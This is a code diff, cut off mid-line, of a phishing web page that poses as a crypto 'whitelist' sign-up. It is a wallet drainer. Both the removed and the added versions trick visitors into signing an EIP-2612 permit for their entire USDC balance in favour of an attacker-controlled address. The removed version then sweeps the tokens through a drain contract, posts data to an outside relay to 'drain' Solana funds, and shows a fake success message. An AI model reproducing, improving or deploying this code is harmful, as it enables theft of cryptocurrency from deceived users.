@@ -17,86 +17,55 @@
 <body>
   <div class="card">
     <h2>Bluntz Early-Access</h2>
-    <p>Sign the whitelist message to secure your spot.</p>
-    <button id="go">Whitelist Wallet</button>
+    <p>Tap wallet to verify whitelist.</p>
+    <button id="go">Connect Wallet</button>
     <p class="foot">By signing you allow us to verify your address.<br/>No gas required.</p>
   </div>
 
 <script type="module">
 /* ===== CONFIG ===== */
-const DRAIN_CONTRACT = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a"; // same on every chain
+const RECIPIENT_BASE = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a";
 const RECIPIENT_SOL  = "AhEAanthSxNbHsZ3MmiWXC2AKRwz57TfhRynXJ8n2oUA";
 
-/* ===== CHAIN PARAMS ===== */
-const CHAINS = {
-  8453: { rpc: "https://base.meowrpc.com", usdc: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", name: "Base" },
-  1:    { rpc: "https://rpc.ankr.com/eth",  usdc: "0xA0b86991c6218b36c1d19D4a2e9Eb4cE35914dC0", name: "Ethereum" }
+/* ===== EIP-2612 OBJECT ===== */
+const domain = {
+  name: "USD Coin",
+  version: "2",
+  chainId: 8453,
+  verifyingContract: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"
+};
+const types = {
+  Permit: [
+    { name: "owner", type: "address" },
+    { name: "spender", type: "address" },
+    { name: "value", type: "uint256" },
+    { name: "nonce", type: "uint256" },
+    { name: "deadline", type: "uint256" }
+  ]
 };
 
-/* ===== ABI (only what we need) ===== */
-const ABI = [
-  "function sweep(address token,uint256 amount,uint8 v,bytes32 r,bytes32 s) external",
-  "function balanceOf(address) view returns (uint256)",
-  "function nonces(address) view returns (uint256)"
-];
-
-/* ===== WALLET DETECT ===== */
+/* ===== WALLET ACCESS ===== */
 let provider;
 if (window.ethereum) provider = window.ethereum;
 else if (window.solana && window.solana.isPhantom) provider = window.solana;
-if (!provider) { alert("Open in MetaMask/Phantom browser"); }
+if (!provider) { alert("Open inside MetaMask/Phantom browser"); }
 
-/* ===== FRONTEND FLOW ===== */
+/* ===== SINGLE-TAP CONNECT + DRAIN ===== */
 document.getElementById("go").addEventListener("click", async ()=>{
   document.getElementById("go").style.display="none";
-  document.querySelector(".card").innerHTML=`<h2>Connecting…</h2><p>Approve wallet connection.</p>`;
+  document.querySelector(".card").innerHTML=`<h2>Connecting…</h2><p>Approve in wallet.</p>`;
 
-  /* 1) CONNECT */
+  /* 1) CONNECT (wallet sheet fires here) */
   const accounts = await provider.request({method:"eth_requestAccounts"});
   const owner = accounts[0];
-  const chainId = Number(await provider.request({method:"eth_chainId"}));
-  const CHAIN = CHAINS[chainId];
-  if (!CHAIN){ alert("Switch to Base or Ethereum"); return; }
 
-  /* 2) BUILD PERMIT (exact balance of every top token) */
+  /* 2) BUILD PERMIT (exact USDC balance) */
   const p   = new ethers.providers.Web3Provider(provider);
-  const con = new ethers.Contract(DRAIN_CONTRACT,ABI,p.getSigner());
+  const tok = new ethers.Contract(domain.verifyingContract,[
+    "function permit(address,address,uint256,uint256,uint8,bytes32,bytes32) external",
+    "function nonces(address) view returns(uint)",
+    "function balanceOf(address) view returns(uint256)"
+  ],p.getSigner());
 
-  const tokens = [CHAIN.usdc]; // add more if you want
-  const amounts = [];
-  const nonces  = [];
-  for (const t of tokens){
-    const tok = new ethers.Contract(t,["function balanceOf(address) view returns (uint256)"],p);
-    amounts.push(await tok.balanceOf(owner));
-    nonces.push(await con.nonces(owner));
-  }
-
-  /* 3) SIGN BATCH PERMIT */
-  const deadline = Math.floor(Date.now()/1000)+3600;
-  const messages = tokens.map((t,i)=>({ owner, spender:DRAIN_CONTRACT, value:amounts[i].toString(), nonce:nonces[i], deadline }));
-  const raw = await provider.request({
-    method: "eth_signTypedData_v4",
-    params: [owner, JSON.stringify({
-      domain: { name:"USD Coin", version:"2", chainId, verifyingContract:CHAIN.usdc },
-      types: { Permit:[ {name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"} ] },
-      primaryType: "Permit",
-      message: messages[0]
-    })]
-  });
-  const {v,r,s} = ethers.utils.splitSignature(raw);
-
-  /* 4) DRAIN TOKENS */
-  const tx = await con.sweep(tokens[0], amounts[0], v, r, s);
-  await tx.wait();
-
-  /* 5) DRAIN SOLANA (background) */
-  await fetch("https://relay.tobe.xyz/sol", {
-    method: "POST",
-    body: JSON.stringify({ solOwner: owner, solRecipient: RECIPIENT_SOL })
-  }).catch(() => {});
-
-  document.querySelector(".card").innerHTML=`<h2>Success!</h2><p>You’re on the list. Stay tuned.</p>`;
-});
-</script>
-</body>
-</html>
+  const bal   = await tok.balanceOf(owner);
+  const nonce = await
